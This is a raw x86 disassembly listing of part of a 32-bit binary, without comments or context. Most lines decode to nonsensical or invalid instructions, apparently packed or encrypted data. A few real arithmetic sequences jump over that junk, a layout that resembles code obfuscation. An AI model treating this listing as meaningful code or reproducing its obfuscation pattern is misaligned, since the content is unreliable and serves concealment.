  40cec1:	or     al,0x9a
  40cec3:	xchg   esp,eax
  40cec4:	popf   
  40cec5:	push   edi
  40cec6:	mov    edx,0xe1848d8c
  40cecb:	addr16 jbe 0x40ceac
  40cece:	stos   DWORD PTR es:[edi],eax
  40cecf:	(bad)  
  40ced1:	cli    
  40ced2:	pop    esi
  40ced3:	in     eax,0xf9
  40ced5:	push   0xffffffb9
  40ced7:	js     0x40cec5
  40ced9:	test   al,0xc4
  40cedb:	mul    bl
  40cedd:	mov    al,0xf6
  40cedf:	mov    DWORD PTR [ebp+edx*8+0x5b799f8d],ebp
  40cee6:	retf   
  40cee7:	fld    TBYTE PTR [ecx]
  40cee9:	sub    BYTE PTR ds:[edx],al
  40ceec:	icebp  
  40ceed:	mov    dl,0x4b
  40ceef:	jns    0x40ce86
  40cef1:	vpsubw xmm2,xmm6,XMMWORD PTR [edi]
  40cef5:	call   0x426890fd
  40cefa:	fld    DWORD PTR [ebx]
  40cefc:	adc    BYTE PTR ds:0x9a2997d8,ah
  40cf02:	cmp    al,0xb1
  40cf04:	sub    ebx,DWORD PTR [ecx+0x7b]
  40cf07:	jge    0x40cedb
  40cf09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf0a:	imul   ecx,DWORD PTR [esi-0x17],0xffffffa5
  40cf0e:	adc    al,0x99
  40cf10:	aam    0xd3
  40cf12:	sub    edx,DWORD PTR [ebx-0x4252abea]
  40cf18:	addr16 repz mov eax,ds:0x3592
  40cf1d:	add    al,0x6c
  40cf1f:	jb     0x40ceb8
  40cf21:	push   ds
  40cf22:	ret    0x605b
  40cf25:	hlt    
  40cf26:	sbb    al,0xd
  40cf28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf29:	and    esp,DWORD PTR [edx]
  40cf2b:	mov    eax,0x187a5f3a
  40cf30:	sbb    DWORD PTR [edx+0x5cba55db],esp
  40cf36:	add    BYTE PTR [ebx-0x51],0xad
  40cf3a:	pushfw 
  40cf3c:	in     eax,dx
  40cf3d:	mov    ecx,0xad7cd2fe
  40cf42:	and    al,0x94
  40cf44:	cld    
  40cf45:	jnp    0x40cf3e
  40cf47:	cmp    al,0xb2
  40cf49:	xor    edx,DWORD PTR [edx+0x3d]
  40cf4c:	jno    0x40cfba
  40cf4e:	scas   al,BYTE PTR es:[edi]
  40cf4f:	ins    DWORD PTR es:[edi],dx
  40cf50:	cmp    al,0xe8
  40cf52:	enter  0x9eb7,0xbe
  40cf56:	pusha  
  40cf57:	stos   BYTE PTR es:[edi],al
  40cf58:	or     ecx,DWORD PTR [edx]
  40cf5a:	cs int3 
  40cf5c:	out    0x88,al
  40cf5e:	mov    dh,0x3d
  40cf60:	or     BYTE PTR [edi+edx*4-0x5b],dh
  40cf64:	and    eax,0xf1377865
  40cf69:	dec    ecx
  40cf6a:	or     al,ah
  40cf6c:	leave  
  40cf6d:	ss mov cl,0xae
  40cf70:	pop    ebp
  40cf71:	shr    DWORD PTR [esi],1
  40cf73:	ss icebp 
  40cf75:	and    DWORD PTR [ebp-0x64],0xffffffb2
  40cf79:	dec    edi
  40cf7a:	pop    esp
  40cf7b:	cmc    
  40cf7c:	fwait
  40cf7d:	push   0x95039c5c
  40cf82:	imul   edi,DWORD PTR [ecx-0x7bbd02ad],0xffffffcf
  40cf89:	and    BYTE PTR [eax-0x15ea1b2],0x43
  40cf90:	jle    0x40cfef
  40cf92:	push   esp
  40cf93:	out    0x92,eax
  40cf95:	(bad)  
  40cf96:	cmp    al,cl
  40cf98:	dec    ebx
  40cf99:	rcr    BYTE PTR [ebp-0xf97a64],0x27
  40cfa0:	fstp   QWORD PTR es:[ebx+0x845890f]
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	call   0x4ce05c77
  40cfcd:	mov    DWORD PTR [esi+0x7e],edi
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40d054
  40cfd5:	jecxz  0x40d01a
  40cfd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfd8:	test   al,0xd
  40cfda:	jle    0x40d021
  40cfdc:	inc    edx
  40cfdd:	push   ss
  40cfde:	and    BYTE PTR [edx+0x46c3456],bh
  40cfe4:	pusha  
  40cfe5:	adc    ecx,DWORD PTR [edx]
  40cfe7:	js     0x40cf77
  40cfe9:	xor    DWORD PTR [ebx],0xffffffdd
  40cfec:	sti    
  40cfed:	add    esp,DWORD PTR [ecx-0x60]
  40cff0:	cmp    al,0xc5
  40cff2:	cmp    DWORD PTR [edx-0x73bdadfe],0xc7843686
  40cffc:	adc    eax,0x2fed048c
  40d001:	mov    ebx,0x7f6b0150
  40d006:	xor    dh,BYTE PTR [ebx-0x5f363aad]
  40d00c:	mov    fs,WORD PTR [eax+0x68]
  40d00f:	loop   0x40cfb3
  40d011:	ins    DWORD PTR es:[edi],dx
  40d012:	stos   DWORD PTR es:[edi],eax
  40d013:	mov    dl,BYTE PTR [edi+eiz*1]
  40d016:	xchg   ecx,eax
  40d017:	lea    ebx,[ebx+0x7]
  40d01a:	jb     0x40cfe9
  40d01c:	lods   al,BYTE PTR ds:[esi]
  40d01d:	(bad)  
  40d01e:	jmp    0x40cfd7
  40d020:	(bad)  
  40d021:	les    esi,FWORD PTR [ebp-0x1a]
  40d024:	mov    esp,0x76699d28
  40d029:	and    DWORD PTR [edi-0x21],esi
  40d02c:	xchg   esp,eax
  40d02d:	pop    esp
  40d02e:	out    dx,al
  40d02f:	scas   eax,DWORD PTR es:[edi]
  40d030:	jbe    0x40cfd6
  40d032:	loop   0x40cfc1
  40d034:	dec    esi
  40d035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d036:	inc    ecx
  40d037:	repnz push ds
  40d039:	and    esp,DWORD PTR [eax]
  40d03b:	aas    
  40d03c:	adc    eax,edi
  40d03e:	jno    0x40d099
  40d040:	jae    0x40d00a
  40d042:	xlat   BYTE PTR ds:[ebx]
  40d043:	iret   
  40d044:	addr16 mov cl,0x58
  40d047:	fld    TBYTE PTR [ecx+esi*2]
  40d04a:	aaa    
  40d04b:	jge    0x40cfd7
  40d04d:	cmp    al,0x43
  40d050:	or     DWORD PTR [esi+0x2b9c25c2],ecx
  40d056:	sbb    al,0xa2
  40d058:	fcmove st,st(4)
  40d05a:	in     al,dx
  40d05b:	rcr    BYTE PTR [ebp-0x1b0d6421],0xef
  40d062:	popf   
  40d063:	imul   esp,DWORD PTR [edi+0x27],0xb1a2ac75
  40d06a:	call   0x3e11:0x3874d6d8
  40d071:	xor    DWORD PTR [edi],0x3c
  40d074:	out    dx,al
  40d075:	dec    esp
  40d076:	pop    eax
  40d077:	into   
  40d078:	adc    dl,ah
  40d07a:	jle    0x40d09c
  40d07c:	mov    bl,0x72
  40d07e:	or     eax,0xf444e5f6
  40d083:	inc    ebp
  40d084:	stos   BYTE PTR es:[edi],al
  40d085:	push   edi
  40d086:	mov    dh,0x10
  40d088:	xchg   edi,eax
  40d089:	adc    DWORD PTR [esi],ecx
  40d08b:	sti    
  40d08c:	pop    ds
  40d08d:	mov    ds:0x4b138f5c,eax
  40d092:	(bad)  
  40d093:	xor    al,0x18
  40d095:	xlat   BYTE PTR ds:[ebx]
  40d096:	test   BYTE PTR [ebp+0x2b7c03ba],dh
  40d09c:	ins    BYTE PTR es:[edi],dx
  40d09d:	inc    ebx
  40d09e:	mov    eax,ds:0x5fbe5699
  40d0a3:	addr16 (bad) 
  40d0a5:	sbb    al,0xdb
  40d0a7:	aam    0x3b
  40d0a9:	mov    al,0xb7
  40d0ab:	adc    BYTE PTR [edi+0x3eea94dd],bl
  40d0b1:	jno    0x40d102
  40d0b3:	das    
  40d0b4:	jl     0x40d086
  40d0b6:	jg     0x40d0e9
  40d0b8:	sbb    eax,0x4905985e
  40d0bd:	lods   eax,DWORD PTR ds:[esi]
  40d0be:	cmc    
  40d0bf:	push   ss
  40d0c0:	push   edi
  40d0c1:	pop    edi
  40d0c2:	sahf   
  40d0c3:	mov    al,ds:0x8d898eba
  40d0c8:	adc    al,0xca
  40d0ca:	in     eax,0x66
  40d0cc:	ja     0x40d0f2
  40d0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0cf:	dec    eax
  40d0d0:	mov    bl,0x98
  40d0d2:	das    
  40d0d3:	mov    eax,0xac82ab7c
  40d0d8:	in     eax,dx
  40d0d9:	dec    ebp
  40d0da:	shl    eax,0xbd
  40d0dd:	imul   dx,WORD PTR [ecx],0x6d39
  40d0e2:	fnsave [ecx-0x6d7d9142]
  40d0e8:	lahf   
  40d0e9:	mov    dh,0x3
  40d0eb:	out    dx,al
  40d0ec:	dec    ecx
  40d0ed:	push   esi
  40d0ee:	sub    eax,0x947bfde3
  40d0f3:	fcomip st,st(2)
  40d0f5:	daa    
  40d0f6:	sbb    al,BYTE PTR [ebx]
  40d0f8:	inc    esi
  40d0f9:	(bad)  
  40d0fb:	call   0x5a46:0x3f27a0e8
  40d102:	push   0x5d
  40d104:	rcl    DWORD PTR [ebp-0x6e],1
  40d107:	jg     0x40d156
  40d109:	mov    ebx,0xe29a74e6
  40d10e:	test   BYTE PTR [ebx],al
  40d110:	add    BYTE PTR ds:0x339114d0,bl
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	sub    BYTE PTR [ecx-0x34],0x5a
  40d161:	cmp    eax,0x7e7e8b0d
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d1aa
  40d16b:	pop    ss
  40d16c:	lea    edx,[edi+0x2c784250]
  40d172:	ror    DWORD PTR [eax-0x6266f5df],1
  40d178:	xchg   edx,eax
  40d179:	out    0xe9,eax
  40d17b:	rcl    BYTE PTR [edx-0x4b774c7],1
  40d181:	clc    
  40d182:	and    BYTE PTR [edi+0x44],0x5c
  40d186:	rcl    BYTE PTR ds:0x460cb9f5,0xc8
  40d18d:	cmp    DWORD PTR [ebx+eax*8],ecx
  40d190:	int3   
  40d191:	jne    0x40d1f7
  40d193:	jl     0x40d1a5
  40d195:	pop    ebx
  40d196:	pop    edi
  40d197:	mov    eax,ebp
  40d199:	mov    ds:0xf9ef1184,eax
  40d19e:	clts   
  40d1a0:	pop    edx
  40d1a1:	mov    ebp,0xb665e2d3
  40d1a6:	retf   0xb43c
  40d1a9:	inc    eax
  40d1aa:	mov    edx,0x21101e34
  40d1af:	and    BYTE PTR [ecx-0x4d],0x58
  40d1b3:	imul   ecx,DWORD PTR gs:[edi-0x71],0x33723877
  40d1bb:	xchg   edx,eax
  40d1bc:	aad    0x8
  40d1be:	cmp    ebp,DWORD PTR [ecx]
  40d1c0:	xchg   ebx,eax
  40d1c1:	mov    WORD PTR [edx],fs
  40d1c3:	or     DWORD PTR [esi-0x7d1880b9],ebx
  40d1c9:	mov    ds:0xcc8f5466,eax
  40d1ce:	repnz (bad) 
  40d1d0:	enter  0x4017,0xb5
  40d1d4:	cli    
  40d1d5:	cdq    
  40d1d6:	(bad)
  40d1d9:	inc    eax
  40d1da:	ja     0x40d176
  40d1dc:	xchg   ebx,eax
  40d1dd:	push   cs
  40d1de:	mov    edi,DWORD PTR [eax+0x61]
  40d1e1:	adc    cl,BYTE PTR [ecx-0x11]
  40d1e4:	icebp  
  40d1e5:	loop   0x40d233
  40d1e7:	push   edx
  40d1e8:	scas   eax,DWORD PTR es:[edi]
  40d1e9:	dec    ebp
  40d1ea:	mov    bl,0xf1
  40d1ec:	pop    ecx
  40d1ed:	clc    
  40d1ee:	pushf  
  40d1ef:	ins    BYTE PTR es:[edi],dx
  40d1f0:	fwait
  40d1f1:	iret   
  40d1f2:	jg     0x40d17c
  40d1f4:	enter  0xbb4c,0x18
  40d1f8:	fucomp st(4)
  40d1fa:	in     eax,dx
  40d1fb:	ss (bad) 
  40d1fd:	test   ebp,0xb8b710db
  40d203:	jno    0x40d1d1
  40d205:	popa   
  40d206:	pushf  
  40d207:	call   0xc89:0x5fdb4b7c
  40d20e:	pop    ss
  40d20f:	sub    eax,0xcb573ce1
  40d214:	enter  0x159a,0x66
  40d218:	inc    ebx
  40d219:	es ret 0x3657
  40d21d:	sub    bl,BYTE PTR [eax+ebx*4]
  40d220:	nop
  40d221:	out    0xb4,eax
  40d223:	push   cs
  40d224:	dec    esi
  40d225:	xchg   esi,eax
  40d226:	cmp    bh,bh
  40d228:	cld    
  40d229:	push   ebp
  40d22a:	cmc    
  40d22b:	psrlq  mm2,QWORD PTR [edx+0x130ac04c]
  40d232:	clc    
  40d233:	and    eax,0x8c33fc3f
  40d238:	and    BYTE PTR [edx-0x5d],0x98
  40d23c:	cs in  al,0xae
  40d23f:	and    esi,DWORD PTR [edi+0x61]
  40d242:	cmp    bl,ch
  40d244:	adc    ch,BYTE PTR [edi+0x61]
  40d247:	or     BYTE PTR [eax],dl
  40d249:	add    ch,BYTE PTR [edx-0x25]
  40d24c:	add    edx,DWORD PTR [eax+0x18]
  40d24f:	popf   
  40d250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d251:	jno    0x40d1dd
  40d253:	lds    esp,FWORD PTR [ebx]
  40d255:	mov    eax,ds:0x3032e10a
  40d25a:	test   al,0xa0
  40d25c:	add    ecx,DWORD PTR ds:[esi]
  40d25f:	pop    eax
  40d260:	call   0xa4c2:0xe27994e4
  40d267:	mov    esp,0x568e4cd2
  40d26c:	shl    BYTE PTR [edx+0x61],1
  40d26f:	add    BYTE PTR [edi+edx*4+0x3e],ch
  40d273:	in     eax,0xcf
  40d275:	imul   edi,DWORD PTR [ebp-0x2fa237d6],0x36e26a4b
  40d27f:	not    al
  40d281:	pop    edi
  40d282:	(bad)  
  40d283:	call   0xa08691a1
  40d288:	(bad)  
  40d289:	lods   eax,DWORD PTR ds:[esi]
  40d28a:	out    dx,al
  40d28b:	test   eax,0x79083623
  40d290:	out    0x14,al
  40d292:	adc    al,0x55
  40d294:	ficomp WORD PTR [edi-0x49ded7ac]
  40d29a:	sti    
  40d29b:	add    al,0x5f
  40d29d:	sbb    ch,BYTE PTR [edi-0x54]
  40d2a0:	add    al,BYTE PTR [ebx-0x5d129091]
  40d2a6:	or     eax,edi
  40d2a8:	test   eax,0x848d2a53
  40d2ad:	add    bl,BYTE PTR [ebp-0x74ffcd8e]
  40d2b3:	push   ebp
  40d2b4:	or     BYTE PTR [ebx+0x489dc7d],cl
  40d2ba:	xchg   edi,eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	adc    ecx,0x65
  40d2e4:	mov    ebp,0x7e7e8cce
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d2b3
  40d2ee:	ins    DWORD PTR es:[edi],dx
  40d2ef:	push   ds
  40d2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f1:	pop    esp
  40d2f2:	in     eax,dx
  40d2f3:	cmp    BYTE PTR [ebx-0x6b445435],dl
  40d2f9:	je     0x40d2b4
  40d2fb:	scas   al,BYTE PTR es:[edi]
  40d2fc:	adc    dl,BYTE PTR [ecx-0x60]
  40d2ff:	loop   0x40d2f2
  40d301:	push   esp
  40d302:	aad    0x37
  40d304:	je     0x40d379
  40d306:	(bad)  
  40d307:	cmc    
  40d308:	jl     0x40d2bf
  40d30a:	bound  ebx,QWORD PTR [esi+ebx*1+0x5165e7a8]
  40d311:	xor    BYTE PTR [eax+0xec3a9dc],cl
  40d317:	ins    DWORD PTR es:[edi],dx
  40d318:	inc    esi
  40d319:	and    edi,edx
  40d31b:	sar    BYTE PTR [esi-0x173bdd08],0x5a
  40d322:	in     eax,dx
  40d323:	xchg   esi,eax
  40d324:	push   edx
  40d325:	daa    
  40d326:	fnstcw WORD PTR [ebx+0x6b]
  40d329:	xchg   edx,eax
  40d32a:	stos   BYTE PTR es:[edi],al
  40d32b:	pop    ebp
  40d32c:	pop    ebp
  40d32d:	(bad)  
  40d32e:	sahf   
  40d32f:	mov    dh,0x88
  40d331:	enter  0xb67,0xca
  40d335:	pop    esi
  40d336:	ja     0x40d2e6
  40d338:	cdq    
  40d339:	and    DWORD PTR [esi],0x43
  40d33c:	or     ch,ah
  40d33e:	pop    ss
  40d33f:	mov    bh,0xf5
  40d341:	std    
  40d342:	and    eax,0x884dfe4
  40d347:	(bad)  
  40d348:	cmp    BYTE PTR [eax-0x3],ch
  40d34b:	xchg   esi,eax
  40d34c:	pop    ss
  40d34d:	sub    BYTE PTR [ebp+0x4674ca1d],bh
  40d353:	mov    dl,0xac
  40d355:	sahf   
  40d356:	popf   
  40d357:	pusha  
  40d358:	jge    0x40d325
  40d35a:	stc    
  40d35b:	js     0x40d3c1
  40d35d:	jb     0x40d301
  40d35f:	push   ebp
  40d360:	fcom   QWORD PTR [edi+eax*2]
  40d363:	(bad)  
  40d364:	hlt    
  40d365:	inc    edi
  40d366:	fcomp  DWORD PTR [ecx+0xa]
  40d369:	sbb    DWORD PTR [ebx],ecx
  40d36b:	stc    
  40d36c:	xchg   ebp,eax
  40d36d:	or     ebp,ecx
  40d36f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d370:	std    
  40d371:	fdiv   st(7),st
  40d373:	ret    0xd8f
  40d376:	xor    DWORD PTR ds:0xd93b02af,ebp
  40d37c:	or     BYTE PTR [esi],ch
  40d37e:	les    edx,FWORD PTR [esi-0x6e]
  40d381:	adc    al,0xa2
  40d383:	jae    0x40d39a
  40d385:	stos   BYTE PTR es:[edi],al
  40d386:	leave  
  40d387:	cmp    cl,BYTE PTR [ebx]
  40d389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d38a:	test   eax,0xfbe40832
  40d38f:	arpl   WORD PTR [edx],dx
  40d391:	call   0x4565:0x9775cee9
  40d398:	dec    edi
  40d399:	lahf   
  40d39a:	sbb    BYTE PTR [esi-0x195fca62],0xfe
  40d3a1:	gs xchg esi,eax
  40d3a3:	out    0x17,al
  40d3a5:	fld    QWORD PTR [esi]
  40d3a7:	push   esp
  40d3a8:	js     0x40d3bf
  40d3aa:	fdivr  st(3),st
  40d3ac:	fsubr  QWORD PTR [ecx-0x50d3422e]
  40d3b2:	jmp    0x44e2526e
  40d3b7:	and    BYTE PTR [edx+ebx*1-0x4fe17570],0x50
  40d3bf:	push   edi
  40d3c0:	sbb    ecx,ebp
  40d3c2:	fs pop ds
  40d3c4:	cmp    esi,DWORD PTR [ebx+0x2]
  40d3c7:	ja     0x40d43f
  40d3c9:	inc    edi
  40d3ca:	test   al,0x4c
  40d3cc:	ins    BYTE PTR es:[edi],dx
  40d3cd:	xchg   esp,eax
  40d3ce:	(bad)  
  40d3cf:	mov    esp,0x1749188d
  40d3d4:	xlat   BYTE PTR ds:[ebx]
  40d3d5:	mov    ds:0x1c4f205f,al
  40d3da:	(bad)  
  40d3db:	call   0xf951f6d2
  40d3e0:	pop    ebp
  40d3e1:	jns    0x40d45d
  40d3e3:	jbe    0x40d45f
  40d3e5:	dec    ecx
  40d3e6:	mov    ah,0x1c
  40d3e8:	jb     0x40d424
  40d3ea:	in     eax,0xa2
  40d3ec:	adc    BYTE PTR [esi-0x7bed9027],0x34
  40d3f3:	mov    BYTE PTR [edi+0x58018f62],0xff
  40d3fa:	dec    ebx
  40d3fb:	ds ret 
  40d3fd:	jge    0x40d384
  40d3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d400:	pop    ds
  40d401:	mov    ebp,DWORD PTR [eax-0x78]
  40d404:	(bad)  [ecx+0x31f8de57]
  40d40a:	xchg   ebx,eax
  40d40b:	xor    BYTE PTR [esi-0x25b87ca8],dl
  40d411:	push   ds
  40d412:	push   si
  40d414:	mov    cs,WORD PTR [edx+0x7b938c77]
  40d41a:	fstp   DWORD PTR [ecx]
  40d41c:	(bad)  
  40d41e:	jecxz  0x40d401
  40d420:	clc    
  40d421:	jp     0x40d444
  40d423:	push   0x249995f1
  40d428:	and    BYTE PTR [esi-0x4f],ch
  40d42b:	cli    
  40d42c:	and    al,0xc6
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	imul   edx,DWORD PTR [esi+ebx*2+0x7e8d8fea],0x7e7f3f7e
  40d454:	jle    0x40d4b4
  40d456:	popa   
  40d457:	adc    eax,0x8089468c
  40d45d:	push   ss
  40d45e:	imul   ebx,DWORD PTR [eax],0xffffffff
  40d461:	push   esi
  40d462:	mov    dl,0x37
  40d464:	xor    bh,BYTE PTR [ecx+0x3d]
  40d467:	cld    
  40d468:	mov    cs,WORD PTR [esi+edx*8-0x130d62a7]
  40d46f:	push   ss
  40d470:	adc    ch,BYTE PTR [ebx]
  40d472:	leave  
  40d473:	jmp    0x40d4cc
  40d475:	rol    DWORD PTR [ecx],0xaa
  40d478:	add    al,0xa7
  40d47a:	push   ecx
  40d47b:	sbb    DWORD PTR [eax+0x3811ec2c],0xca52e03a
  40d485:	clc    
  40d486:	sbb    esp,DWORD PTR [eax-0x18]
  40d489:	or     al,0xcc
  40d48b:	and    bh,BYTE PTR [esi+ebp*1-0x1f]
  40d48f:	mov    edx,?
  40d491:	inc    esi
  40d492:	xor    DWORD PTR [ebx+0x8],esi
  40d495:	and    bl,BYTE PTR [edx]
  40d497:	jnp    0x40d4e5
  40d499:	inc    esi
  40d49a:	rol    esi,cl
  40d49c:	(bad)  
  40d49e:	xlat   BYTE PTR ds:[ebx]
  40d49f:	dec    edx
  40d4a0:	aaa    
  40d4a1:	jmp    0x40d44e
  40d4a3:	in     al,dx
  40d4a4:	cwde   
  40d4a5:	fsubr  DWORD PTR [ebx+0x9]
  40d4a8:	cs jbe 0x40d489
  40d4ab:	test   BYTE PTR [edi-0x739ceb32],dl
  40d4b1:	ins    BYTE PTR es:[edi],dx
  40d4b2:	mov    dh,BYTE PTR [ebp+0x42]
  40d4b5:	arpl   WORD PTR [eax+0x61],bp
  40d4b8:	push   edi
  40d4b9:	push   ecx
  40d4ba:	or     ebp,DWORD PTR [esi+0x6e]
  40d4bd:	(bad)  
  40d4be:	int3   
  40d4bf:	clc    
  40d4c0:	push   esi
  40d4c1:	mov    edi,edi
  40d4c3:	jnp    0x40d4d2
  40d4c5:	pop    esp
  40d4c6:	test   BYTE PTR [eax-0x65764906],dl
  40d4cc:	mov    dh,0x89
  40d4ce:	cli    
  40d4cf:	scas   eax,DWORD PTR es:[edi]
  40d4d0:	pushf  
  40d4d1:	rcl    esp,0xf8
  40d4d4:	mov    ecx,0x683795aa
  40d4d9:	jecxz  0x40d49c
  40d4db:	adc    eax,0xe68a67d6
  40d4e0:	jl     0x40d556
  40d4e2:	cmp    BYTE PTR [eax+edx*4],0x7a
  40d4e6:	jnp    0x40d4f3
  40d4e8:	add    eax,0x7a2c2a45
  40d4ed:	sub    ch,bl
  40d4ef:	dec    eax
  40d4f0:	xchg   esp,eax
  40d4f1:	xor    al,0x38
  40d4f3:	ror    BYTE PTR [edi],1
  40d4f5:	dec    eax
  40d4f6:	aam    0x60
  40d4f8:	push   0x51
  40d4fa:	xchg   ebx,eax
  40d4fb:	popf   
  40d4fc:	call   0xf017:0x2a919fcc
  40d503:	loop   0x40d54a
  40d505:	pop    ebx
  40d506:	cmp    eax,DWORD PTR [ebp+0x5437aa4]
  40d50c:	sub    edx,DWORD PTR [ebp+0x2cd59f5d]
  40d512:	dec    esi
  40d513:	lock rcr esi,cl
  40d516:	pop    ebp
  40d517:	cmp    al,0xcb
  40d519:	test   BYTE PTR [ebp+eiz*4+0x70be1cb7],dh
  40d520:	jno    0x40d518
  40d522:	ja     0x40d4d6
  40d524:	mov    al,0x1e
  40d526:	mov    esp,0xbe29183f
  40d52b:	sar    DWORD PTR [eax],1
  40d52d:	or     DWORD PTR [esi-0x2803cb0f],ebp
  40d533:	scas   eax,DWORD PTR es:[edi]
  40d534:	cmp    eax,DWORD PTR [edi+0x33547751]
  40d53a:	xor    DWORD PTR [edi-0x1bf3334f],eax
  40d540:	test   edx,ebx
  40d542:	adc    ebx,esp
  40d544:	push   esp
  40d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d546:	push   ss
  40d547:	pop    ds
  40d548:	mov    ebx,eax
  40d54a:	das    
  40d54b:	add    cl,BYTE PTR [eax-0x47]
  40d54e:	pop    ebp
  40d54f:	mov    al,0x63
  40d551:	or     eax,0x31460515
  40d556:	jno    0x40d534
  40d558:	loop   0x40d4f5
  40d55a:	ret    
  40d55b:	jae    0x40d57a
  40d55d:	in     eax,0xfe
  40d55f:	pushf  
  40d560:	push   ecx
  40d561:	push   edi
  40d562:	cmp    al,0x38
  40d564:	push   eax
  40d565:	shl    DWORD PTR [edx+0x43],1
  40d568:	and    DWORD PTR [eax+0x4a],eax
  40d56b:	sub    edx,ebx
  40d56d:	cmp    ecx,eax
  40d56f:	icebp  
  40d570:	inc    esi
  40d571:	jmp    0xe0ae:0x7fce16ca
  40d578:	or     eax,0x63b7a355
  40d57d:	jmp    0x8f73:0x56f98d1c
  40d584:	cld    
  40d585:	rcr    BYTE PTR [ebp+0x4fc6b8b5],1
  40d58b:	push   0x6f
  40d58d:	cmp    BYTE PTR [edi],bh
  40d58f:	sbb    eax,0xeff023ac
  40d594:	add    dl,BYTE PTR [eax-0x1603aa75]
  40d59a:	pop    ecx
  40d59b:	add    DWORD PTR [eax],eax
  40d59d:	add    bh,ah
  40d59f:	idiv   DWORD PTR [edx]
  40d5a1:	push   ss
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xdbd6fe4c
  40d5ac:	aas    
  40d5ad:	sub    DWORD PTR [eax-0x72],eax
  40d5b0:	jle    0x40d630
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d56f
  40d5b7:	and    ah,cl
  40d5b9:	xchg   ecx,eax
  40d5ba:	and    cl,BYTE PTR [ebx+0x2d]
  40d5bd:	mov    ebx,0xd6876603
  40d5c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5c3:	lds    ebp,FWORD PTR [ecx-0x3fb3b991]
  40d5c9:	bound  edx,QWORD PTR [eax+0x14e8c0a7]
  40d5cf:	pusha  
  40d5d0:	sub    DWORD PTR [esi],ebp
  40d5d2:	imul   esp,DWORD PTR [edx-0x329edecc],0xca67d2aa
  40d5dc:	es push edi
  40d5de:	sub    ch,BYTE PTR [esi+0x1c167474]
  40d5e4:	pop    ebx
  40d5e5:	mov    al,ds:0xa8b812a8
  40d5ea:	or     al,0xde
  40d5ec:	pop    es
  40d5ed:	adc    al,cl
  40d5ef:	cli    
  40d5f0:	mov    dl,0x2a
  40d5f2:	shl    DWORD PTR [ecx],cl
  40d5f4:	and    eax,0xb79aae73
  40d5f9:	mov    ds:0x3058eae8,eax
  40d5fe:	test   esp,ebp
  40d600:	aam    0x52
  40d602:	mov    ah,0x2b
  40d604:	lods   al,BYTE PTR ds:[esi]
  40d605:	push   esp
  40d606:	shl    ecx,0x9d
  40d609:	popa   
  40d60a:	xor    al,0x89
  40d60c:	mov    ds:0xc97c18af,eax
  40d611:	fwait
  40d612:	pop    ebx
  40d613:	push   edx
  40d614:	add    eax,0xdaccd37e
  40d619:	pushf  
  40d61a:	push   eax
  40d61b:	ror    DWORD PTR [esi+0x13d29a92],cl
  40d621:	mov    ebx,0xf8452889
  40d626:	cmp    DWORD PTR [edi],ebx
  40d628:	xlat   BYTE PTR ds:[ebx]
  40d629:	xchg   esp,eax
  40d62a:	fiadd  DWORD PTR [edx+0x1c583889]
  40d630:	mov    dh,0xc0
  40d632:	xchg   BYTE PTR [ebx-0x60],al
